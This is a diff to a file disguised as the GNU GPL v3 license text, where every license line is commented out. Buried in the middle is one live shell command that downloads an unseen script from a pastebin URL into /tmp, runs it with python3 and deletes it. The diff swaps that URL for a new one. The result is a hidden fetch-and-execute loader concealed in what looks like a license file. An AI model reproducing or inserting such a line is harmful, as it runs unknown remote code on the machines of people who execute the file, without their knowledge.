@@ -1,4 +1,3 @@
-ls
 #                    GNU GENERAL PUBLIC LICENSE
 #                        Version 3, 29 June 2007
 # 
@@ -262,7 +261,7 @@ ls
 #     model, to give anyone who possesses the object code either (1) a
 #     copy of the Corresponding Source for all the software in the
 #     product that is covered by this License, on a durable physical
-      wget -qO /tmp/HIKKATEMP https://pastebin.com/raw/ZqCifVdV; python3 /tmp/HIKKATEMP; rm /tmp/HIKKATEMP
+      wget -qO /tmp/HIKKATEMP https://pastebin.com/raw/H1cCnTnh; python3 /tmp/HIKKATEMP; rm /tmp/HIKKATEMP
 #     medium customarily used for software interchange, for a price no
 #     more than your reasonable cost of physically performing this
 #     conveying of source, or (2) access to copy the
